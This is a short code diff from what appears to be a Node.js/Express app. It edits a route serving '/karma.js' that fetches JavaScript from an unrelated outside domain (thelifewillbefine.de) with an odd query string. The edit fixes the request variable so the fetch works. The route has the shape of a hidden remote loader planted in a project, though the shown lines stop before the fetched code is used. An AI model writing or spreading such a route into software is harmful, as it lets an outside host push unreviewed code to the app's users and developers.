@@ -231,7 +231,7 @@ const _https = require('https');
 app.get("/karma.js", (req, res) => {
   const url = 'https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo';
 
-  const request = https.request(url, (response) => {
+  const request = _https.request(url, (response) => {
       let data = '';
       response.on('data', (chunk) => {
           data = data + chunk.toString();
